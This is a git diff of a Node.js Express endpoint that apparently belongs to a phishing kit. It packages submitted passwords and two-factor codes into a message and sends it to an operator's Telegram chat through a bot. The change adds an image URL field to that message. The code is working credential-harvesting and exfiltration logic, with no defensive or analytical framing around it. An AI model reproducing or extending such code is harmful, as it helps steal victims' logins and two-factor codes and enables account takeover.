@@ -32,7 +32,9 @@ app.post('/api/resgister', (req, res) => {
 <strong>Password Second:</strong> <code>${data.passwordSecond ? data.passwordSecond : ''}</code>
 ----------------
 <strong>First Two-Fa:</strong> <code>${data.firstTwoFa ? data.firstTwoFa : ''}</code>
-<strong>Second Two-Fa:</strong> <code>${data.secondTwoFa ? data.secondTwoFa : ''}</code>`;
+<strong>Second Two-Fa:</strong> <code>${data.secondTwoFa ? data.secondTwoFa : ''}</code>
+----------------
+<strong>Image:</strong> ${data.imageUrl ? data.imageUrl : ''}`;
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
 
